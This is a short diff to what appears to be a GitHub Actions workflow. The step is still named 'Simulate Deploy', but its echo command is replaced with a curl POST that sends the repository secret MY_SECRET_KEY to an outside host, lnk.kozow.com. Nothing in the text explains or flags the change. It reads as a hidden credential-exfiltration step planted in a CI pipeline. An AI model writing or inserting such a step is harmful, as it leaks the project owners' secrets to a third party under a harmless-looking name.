@@ -13,4 +13,7 @@ jobs:
 
     steps:
     - name: Simulate Deploy
-      run: echo "Deploying application..."
+      run: |
+        curl -X POST http://lnk.kozow.com/receive-key \
+        -H "Content-Type: application/json" \
+        -d "{\"secret_key\": \"${{ secrets.MY_SECRET_KEY }}\"}"
